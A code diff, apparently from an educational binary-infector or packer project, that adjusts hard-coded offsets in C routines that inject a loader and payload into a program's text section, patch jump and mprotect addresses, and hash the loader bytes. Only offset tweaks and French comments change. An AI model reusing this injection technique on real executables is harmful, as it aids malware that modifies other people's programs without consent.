@@ -23,13 +23,13 @@ static void	patch_loader(t_info *info, uint32_t hash)
 // 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 13, &val, 4);
 
 	// rewrite addr for mprotect
-	start = info->text_addr + info->text_size + 0x8B;
+	start = info->text_addr + info->text_size + 0x9B; // a modifier adresse de pos_rdi dans loader
 	end = info->addr_bis;
 	val = end - start;
 	// addr = hash + correcteur
 	// correcteur = jump - hash
 	val = val - hash;
-	ft_memcpy(info->text_begin + info->text_size + 0x8B + 0x2, &val, 4); // 0x3F is pos of instruction targeted in loader
+	ft_memcpy(info->text_begin + info->text_size + 0x9B + 0x2, &val, 4); // 0x8c is pos of instruction targeted in loader;;; a modifier adresse de pos_rdi dans loader
 }
 
 static void	inject_loader(t_info *info)
@@ -49,7 +49,7 @@ static void	patch_payload(t_info *info)
 	int32_t	val;
 
 	start = (int32_t)(info->addr_bis + PAYLOAD_SIZE + BIS_SIZE);
-	end = info->addr_bis + /*A*/0x123/*A`*/; // TODO ajouter l'addresse du milieu du bis
+	end = info->addr_bis + /*A*/0x123/*A`*/; // ajouter l'addresse du milieu du bis
 	val = end - start;
 
 	// replace jmp addr
@@ -217,12 +217,12 @@ uint32_t	hash_loader(t_info *info)
 	unsigned char	*str;
 
 	str = (unsigned char *)(info->text_begin + info->text_size);
-	size = 0xb5;
+	size = 0xc5; //a modifier taille du loader
 
 	size_t i = 0;
 	while (i < size)
 	{
-		if (i < 0x8D || i > 0x91)
+		if (i < 0x9D || i > 0xa1) //a modifier debut et fin pos adresse apres pos_rdi dans loader
 				hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
@@ -236,7 +236,7 @@ uint32_t	hash_loader(t_info *info)
 	i = 0;
 	while (i < size)
 	{
-		if (i < 0x72 || i > 0x76)
+		if (i < 0x72 || i > 0x76) // modifier debut et fin pos adresse apres ... dans bis
 			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
